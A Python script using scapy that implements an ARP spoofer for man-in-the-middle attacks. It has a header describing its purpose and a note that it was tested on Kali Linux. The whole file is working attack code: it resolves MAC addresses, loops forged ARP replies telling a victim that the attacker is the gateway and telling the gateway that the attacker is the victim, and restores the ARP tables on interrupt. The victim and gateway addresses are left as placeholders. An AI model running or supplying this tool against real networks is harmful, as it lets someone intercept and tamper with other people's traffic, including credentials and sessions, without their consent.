#!/usr/bin/env python3
# ---------------------------------------------
# Title: ARP Spoofer (Man-in-the-Middle)
# Author: [Your Name]
# Description: Performs ARP spoofing to position
# attacker between target and gateway (MITM attack)
# Tested on: Kali Linux
# ---------------------------------------------

import scapy.all as scapy
import time
import sys

# 🧠 CONFIGURATION - Set the target interface (e.g., eth0, wlan0, eth1)
interface = "eth1"

# 🔍 Function to get MAC address of a given IP
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # Create ARP request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
    arp_request_broadcast = broadcast / arp_request  # Combine packets
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, iface=interface, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc  # Return MAC of response
    else:
        return None

# 🎯 Function to spoof ARP replies (pretend to be gateway to victim and vice versa)
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    if target_mac:
        # Craft ARP reply: "I am the spoof_ip"
        arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        ether_packet = scapy.Ether(dst=target_mac)
        full_packet = ether_packet / arp_packet
        scapy.send(full_packet, iface=interface, verbose=False)  # Send spoofed ARP packet

# 🛠️ Function to restore ARP tables to original state
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        # Send correct ARP reply to restore actual IP-MAC mapping
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                           psrc=source_ip, hwsrc=source_mac)
        ether = scapy.Ether(dst=destination_mac)
        full_packet = ether / packet
        scapy.send(full_packet, count=4, iface=interface, verbose=False)

# 🧠 Set your victim and gateway IPs here
target_ip = "<TARGET_IP>"    # Replace <TARGET_IP> with the victim's IP address
gateway_ip = "<GATEWAY_IP>"  # Replace <GATEWAY_IP> with your router's IP address

# 🚀 Start spoofing loop
try:
    packet_sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)  # Tell victim: "I am gateway"
        spoof(gateway_ip, target_ip)  # Tell router: "I am victim"
        packet_sent_count += 2
        print("\r[+] Sent " + str(packet_sent_count), end="")  # Real-time update
        sys.stdout.flush()
        time.sleep(2)  # Wait before sending again (avoid flooding too hard)

# 🛑 On Ctrl+C - Restore the network
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables. Please wait...\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
